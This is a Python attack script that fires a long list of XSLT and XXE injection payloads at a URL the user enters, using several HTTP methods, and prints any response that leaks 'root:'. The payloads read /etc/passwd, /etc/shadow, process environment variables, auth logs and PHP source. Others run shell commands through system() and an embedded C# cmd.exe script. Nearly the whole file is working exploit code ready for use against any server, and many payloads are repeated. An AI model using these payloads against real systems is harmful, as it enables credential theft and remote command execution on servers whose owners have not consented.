import requests
from termcolor import colored
import pyfiglet

# Generate ASCII banner
ascii_banner = pyfiglet.figlet_format("XSLT VULNERABILITY")
print(ascii_banner)

def xslt_vuln_test(url):
    methods = ['GET', 'POST', 'PUT', 'DELETE']

    # Payloads for XSLT injection
    payloads = [
         '''<?xml version="1.0"?>
        <!DOCTYPE xsl:stylesheet [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
        <html>
        <body>
        <h1>XSLT Vulnerability Test</h1>
        <xsl:value-of select="document('xxe')"/>
        </body>
        </html>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <!DOCTYPE xsl:stylesheet [
        <!ENTITY xxe SYSTEM "file:///etc/shadow">
        ]>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
        <html>
        <body>
        <h1>XSLT Vulnerability Test</h1>
        <xsl:value-of select="document('xxe')"/>
        </body>
        </html>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/fruits">
            <xsl:value-of select="system-property('xsl:vendor')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
        <body>
        <xsl:value-of select="php:function('readfile','index.php')" />
        </body>
        </html>''',

        '''<?xml version="1.0" encoding="utf-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/fruits">
            <xsl:copy-of select="document('/etc/passwd')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
        xmlns:msxsl="urn:schemas-microsoft-com:xslt"
        xmlns:user="urn:my-scripts">
        <msxsl:script language="C#" implements-prefix="user">
        <![CDATA[
        public string execute(){
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.Arguments = "/c dir";
        proc.Start();
        proc.WaitForExit();
        return proc.StandardOutput.ReadToEnd();
        }
        ]]>
        </msxsl:script>
        <xsl:template match="/fruits">
        --- BEGIN COMMAND OUTPUT ---
        <xsl:value-of select="user:execute()"/>
        --- END COMMAND OUTPUT ---
        </xsl:template>
        </xsl:stylesheet>''',

         '''<?xml version="1.0"?>
        <!DOCTYPE xsl:stylesheet [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
        <html>
        <body>
        <h1>XSLT Vulnerability Test</h1>
        <xsl:value-of select="document('xxe')"/>
        </body>
        </html>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <!DOCTYPE xsl:stylesheet [
        <!ENTITY xxe SYSTEM "file:///etc/shadow">
        ]>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
        <html>
        <body>
        <h1>XSLT Vulnerability Test</h1>
        <xsl:value-of select="document('xxe')"/>
        </body>
        </html>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/fruits">
            <xsl:value-of select="system-property('xsl:vendor')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
        <body>
        <xsl:value-of select="php:function('readfile','index.php')" />
        </body>
        </html>''',

        '''<?xml version="1.0" encoding="utf-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/fruits">
            <xsl:copy-of select="document('/etc/passwd')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
        xmlns:msxsl="urn:schemas-microsoft-com:xslt"
        xmlns:user="urn:my-scripts">
        <msxsl:script language="C#" implements-prefix="user">
        <![CDATA[
        public string execute(){
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.Arguments = "/c dir";
        proc.Start();
        proc.WaitForExit();
        return proc.StandardOutput.ReadToEnd();
        }
        ]]>
        </msxsl:script>
        <xsl:template match="/fruits">
        --- BEGIN COMMAND OUTPUT ---
        <xsl:value-of select="user:execute()"/>
        --- END COMMAND OUTPUT ---
        </xsl:template>
        </xsl:stylesheet>''',

       
        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="unparsed-text('/etc/hostname')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="file" select="'/etc/hostname'"/>
            <xsl:value-of select="document($file)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="file" select="'/etc/shadow'"/>
            <xsl:copy-of select="document($file)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="cmd" select="'cat /etc/passwd'"/>
            <xsl:value-of select="system($cmd)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="cmd" select="'/usr/bin/id'"/>
            <xsl:value-of select="system($cmd)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="cmd" select="'ls -la /'"/>
            <xsl:value-of select="system($cmd)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="cmd" select="'uname -a'"/>
            <xsl:value-of select="system($cmd)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="cmd" select="'ifconfig'"/>
            <xsl:value-of select="system($cmd)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="cmd" select="'whoami'"/>
            <xsl:value-of select="system($cmd)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="cmd" select="'cat /etc/hostname'"/>
            <xsl:value-of select="system($cmd)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="cmd" select="'/bin/ls /'"/>
            <xsl:value-of select="system($cmd)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="cmd" select="'cat /etc/shadow'"/>'''

        '''<xsl:value-of select="system($cmd)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///etc/hosts')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///etc/group')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///proc/self/environ')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///proc/version')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///proc/cpuinfo')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///proc/meminfo')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///proc/swaps')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///proc/uptime')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///var/log/syslog')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///var/log/auth.log')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///var/log/dmesg')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///var/log/kern.log')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///var/log/bootstrap.log')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///var/log/faillog')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///var/log/lastlog')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="file" select="'file:///etc/passwd'"/>
            <xsl:value-of select="document($file)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="file" select="'file:///etc/shadow'"/>
            <xsl:value-of select="document($file)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0" encoding="UTF-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="cmd" select="'id'"/>
            <xsl:value-of select="system($cmd)"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('php://filter/read=convert.base64-encode/resource=index.php')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('php://input')"/>
        </xsl:template>
        </xsl:stylesheet>''',

        '''<?xml version="1.0"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('php://memory')"/>
        </xsl:template>
        </xsl:stylesheet>'''

    ]

    def label_payloads(payloads):
        return {f'XSLT{i+1}': payload for i, payload in enumerate(payloads)}

    def analyze_payload(payload):
        """Analyze the payload and assign a metric based on its content."""
        if 'xxe' in payload or 'document' in payload:
            return "high"
        elif 'system-property' in payload or 'php:function' in payload:
            return "medium"
        elif 'msxsl:script' in payload:
            return "low"
        return "low"

    payloads_with_labels = label_payloads(payloads)

    successful_payload = None
    successful_metric = None
    successful_name = None

    # Iterate over HTTP methods and payloads
    for method in methods:
        for name, payload in payloads_with_labels.items():
            headers = {'Content-Type': 'application/xml'}
            response = requests.request(method, url, data=payload, headers=headers)
            metric = analyze_payload(payload)

            # Check if sensitive information is leaked
            if "root:" in response.text:
                successful_payload = payload
                successful_name = name
                successful_metric = metric
                print(colored(f"{metric.capitalize()} risk: XSLT injection detected using {method} method!", "red"))
                print(f"Payload: {successful_name}")
                print("Sensitive information exposed:")
                print(colored(response.text, "red"))
                return  # Stop after the first successful detection

    if not successful_payload:
        print(colored("No XSLT vulnerabilities detected.", "green"))

if __name__ == "__main__":
    url = input("Enter the URL to test: ")
    xslt_vuln_test(url)
